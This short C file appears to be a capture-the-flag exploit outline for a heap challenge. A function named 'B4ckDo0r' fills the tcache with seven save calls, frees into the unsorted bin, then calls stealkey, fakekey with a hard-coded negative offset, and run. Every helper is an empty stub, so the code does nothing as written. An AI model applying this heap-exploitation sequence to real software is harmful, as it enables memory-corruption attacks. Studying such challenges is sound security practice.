#include <stdio.h>

int save(char* a, char* b){return 0;}
int takeaway(char* a){return 0;}
int stealkey(){return 0;}
int fakekey(long long a){return 0;}
int run(){return 0;}

int B4ckDo0r(){
	//tcache full
	save("ccelend", "ccelend");
	save("ccelend", "ccelend");
	save("ccelend", "ccelend");
	save("ccelend", "ccelend");
	save("ccelend", "ccelend");
	save("ccelend", "ccelend");
	save("ccelend", "ccelend");
	
	//unbin
	save("\x00", "ccelend");
	stealkey();
	fakekey(-0x2E19b4);
	run();
	return 0;
}